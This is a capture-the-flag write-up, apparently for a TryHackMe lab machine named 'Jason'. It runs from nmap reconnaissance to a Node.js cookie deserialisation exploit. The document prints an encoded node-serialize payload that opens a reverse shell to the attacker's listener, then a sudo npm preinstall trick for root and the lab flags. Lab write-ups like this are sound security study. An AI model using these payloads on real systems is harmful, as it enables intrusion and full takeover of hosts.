# Jason

# Enumeration/Reconnaissance

```tsx
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn 10.10.116.130
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 03:30 EDT
Warning: 10.10.116.130 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.116.130
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.33 seconds
```

```tsx
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -A -Pn -p 22,80  10.10.116.130 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 03:31 EDT
Nmap scan report for 10.10.116.130
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b2d9d60a745de7a99203e4294ce193c (RSA)
|   256 bf32780183af785ee7fe9c834a7daa6b (ECDSA)
|_  256 12ab1380e5ad7307c848d5ca7c7de0af (ED25519)
80/tcp open  http
|_http-title: Horror LLC
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Tue, 04 Jul 2023 07:32:48 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|     background-posi
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Tue, 04 Jul 2023 07:32:49 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=7/4%Time=64A3CAE6%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDate
SF::\x20Tue,\x2004\x20Jul\x202023\x2007:32:48\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<html><head>\n<title>Horror\x20LLC</title>\n<style>\n\x20\x20
SF:body\x20{\n\x20\x20\x20\x20background:\x20linear-gradient\(253deg,\x20#
SF:4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20\x20\x20\x20background-size:\x20
SF:300%\x20300%;\n\x20\x20\x20\x20-webkit-animation:\x20Background\x2010s\
SF:x20ease\x20infinite;\n\x20\x20\x20\x20-moz-animation:\x20Background\x20
SF:10s\x20ease\x20infinite;\n\x20\x20\x20\x20animation:\x20Background\x201
SF:0s\x20ease\x20infinite;\n\x20\x20}\n\x20\x20\n\x20\x20@-webkit-keyframe
SF:s\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20
SF:background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x205
SF:0%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x20100%\x2050%\n\
SF:x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20ba
SF:ckground-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x20
SF:\n\x20\x20@-moz-keyframes\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n
SF:\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x20
SF:\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-pos
SF:ition:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\x
SF:20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x20\x
SF:20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyframes\x20Background\x20{\n\x20\x
SF:20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x
SF:2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x2
SF:0\x20background-posi")%r(HTTPOptions,E4B,"HTTP/1\.1\x20200\x20OK\r\nCon
SF:tent-Type:\x20text/html\r\nDate:\x20Tue,\x2004\x20Jul\x202023\x2007:32:
SF:49\x20GMT\r\nConnection:\x20close\r\n\r\n<html><head>\n<title>Horror\x2
SF:0LLC</title>\n<style>\n\x20\x20body\x20{\n\x20\x20\x20\x20background:\x
SF:20linear-gradient\(253deg,\x20#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20\
SF:x20\x20\x20background-size:\x20300%\x20300%;\n\x20\x20\x20\x20-webkit-a
SF:nimation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\x20-m
SF:oz-animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\x
SF:20animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20}\n\x20
SF:\x20\n\x20\x20@-webkit-keyframes\x20Background\x20{\n\x20\x20\x20\x200%
SF:\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\
SF:x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20backgro
SF:und-position:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x
SF:20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x2
SF:0\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@-moz-keyframes\x20Background\
SF:x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-posit
SF:ion:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x2
SF:0\x20\x20\x20\x20background-position:\x20100%\x2050%\n\x20\x20\x20\x20}
SF:\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20background-positio
SF:n:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyfr
SF:ames\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\
SF:x20background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x
SF:2050%\x20{\n\x20\x20\x20\x20\x20\x20background-posi");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   184.43 ms 10.8.0.1
2   184.50 ms 10.10.116.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.08 seconds
```

Web page view in HTML

![Untitled](Jason%20images/Untitled.png)

Part of the source code of the page

```html
<h2>Email address:</h2>
<input type="text" id="fname" name="fname"><br><br>
<a class="button-line" id="signup">Submit</a> 
<script>
  document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
  date.setTime(date.getTime()+(-1*24*60*60*1000));
  var expires = "; expires="+date.toGMTString();
  document.cookie = "session=foobar"+expires+"; path=/";
  const Http = new XMLHttpRequest();
  console.log(location);
  const url=window.location.href+"?email="+document.getElementById("fname").value;
  Http.open("POST", url);
  Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
  }); 
</script>
```

# Vulnerabilities Assessment

First, I try to input a normal block of plain text `test` into the `input` field

![Untitled](Jason%20images/Untitled%201.png)

Through ******************BurpSuite******************, I explore an interested thing here:

- When I click on `SUBMIT` button, the application sends a request with `POST` method and the path as `/?email=` and when the server returns the response, it set a ****************************Cookie**************************** `session` within a block of ************Base64************ encrypted
- Then, the client uses the set ******************Cookie****************** `session` to request the main page `/` for the HTML response from server and parse the value in to the `<h3>` tag

![Untitled](Jason%20images/Untitled%202.png)

![Untitled](Jason%20images/Untitled%203.png)

Or if you are good at ********************Javascript******************** → Read the above code in the **********************Enumeration********************** phase

Next I use `base64` to decode the `session`

```tsx
┌──(kali㉿kali)-[~]
└─$ echo "eyJlbWFpbCI6InRlc3RAZW1haWwuY29tIn0=" | base64 -d
{"email":"test"}
```

It was a JavaScript object of the email parameter and its value

Note that there is a hint on the HTML which tell us that this application is built with Nodejs

![Untitled](Jason%20images/Untitled%204.png)

Googling the Nodejs Vulnerabilities for the exploitation

Since the value was reflected in the HTTP response → I try to send a [serialized payload](https://book.hacktricks.xyz/pentesting-web/deserialization#node-serialize) as the email parameter

```
{"email":"_$$ND_FUNC$$_function (){ return 'hacker'; }()"}
```

Decode the payload with `base64` → edit the cookie `session` and refresh the page

![Untitled](Jason%20images/Untitled%205.png)

![Untitled](Jason%20images/Untitled%206.png)

# Gain Access

Use this [shell](https://github.com/piyush-saurabh/exploits/blob/master/nodejsshell.py) to create the payload with `LHOST` = `Local IP` and `LPORT` = `Listening port`

```tsx
┌──(kali㉿kali)-[~/Shells]
└─$ python2 nodejsshell.py 10.8.97.213 4444
[+] LHOST = 10.8.97.213
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,57,55,46,50,49,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Then paste the payload into the cookie value

```
{"email":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,...[REDACTED]...,10))}()"}
```

After decode it with ************base64************

```
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDQ4LDQ2LDU2LDQ2LDU3LDU1LDQ2LDUwLDQ5LDUxLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDUyLDUyLDUyLDUyLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKQp9KCkifQ==
```

Start `Netcat Listener` on the local machine → Paste the cookie to the `session` value and send the request

![Untitled](Jason%20images/Untitled%207.png)

```tsx
┌──(kali㉿kali)-[~/TryHackMe]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.97.213] from (UNKNOWN) [10.10.51.197] 51468
Connected!
id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
```

Now I am connected to the target as `dylan` user. Navigate to `/home/dylan` directory and get the flag

```tsx
$ cd /home/dylan
$ cat user.txt
0ba48780dee9f5677a4461f588af217c
```

# Privilege Escalation → root

```tsx
$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

Through [GTFOBins](https://gtfobins.github.io/gtfobins/npm/#sudo) → The `npm` could be exploited like this

```tsx
$ TF=$(mktemp -d)
$ echo '{"scripts": {"preinstall":"/bin/sh"}}' > $TF/package.json
$ sudo npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.APdGi1fLMd
> /bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

Navigate to `/root` and get the flag

```tsx
# cd /root
# cat root.txt
2cd5a9fd3a0024bfa98d01d69241760e
```